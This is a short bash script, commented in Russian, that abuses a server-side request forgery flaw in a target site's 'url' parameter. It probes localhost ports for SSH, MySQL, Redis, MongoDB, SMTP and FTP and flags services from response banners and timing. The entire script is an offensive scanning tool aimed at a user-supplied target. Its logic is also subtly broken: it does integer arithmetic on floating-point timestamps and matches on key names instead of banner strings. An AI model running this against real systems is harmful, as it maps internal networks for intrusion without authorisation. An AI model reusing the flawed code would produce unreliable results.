#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

echo "[ECHO] Слепой детект внутренних сервисов..."

# База сигнатур ответов
declare -A SERVICE_SIGNS
SERVICE_SIGNS["ssh"]="SSH"
SERVICE_SIGNS["mysql"]="mysql_native_password"
SERVICE_SIGNS["redis"]="REDIS"
SERVICE_SIGNS["http"]="HTTP"
SERVICE_SIGNS["smtp"]="SMTP"
SERVICE_SIGNS["ftp"]="FTP"

for port in 22 80 3306 6379 5432 27017 25 21; do
    # Пробуем через SSRF (если есть уязвимость)
    START=$(python3 -c "import time; print(time.time()*1000)" 2>/dev/null)
    RESP=$(curl -sk --max-time 3 "$TARGET?url=http://127.0.0.1:$port" 2>/dev/null)
    END=$(python3 -c "import time; print(time.time()*1000)" 2>/dev/null)
    DIFF=$((END - START))
    
    if [ "$DIFF" -lt 2000 ] && [ -n "$RESP" ]; then
        for sig in "${!SERVICE_SIGNS[@]}"; do
            echo "$RESP" | grep -qi "$sig" && echo "  🔴 $port: ${SERVICE_SIGNS[$sig]} (${DIFF}ms)"
        done
    elif [ "$DIFF" -lt 500 ]; then
        echo "  🟡 $port: открыт (${DIFF}ms)"
    fi
done
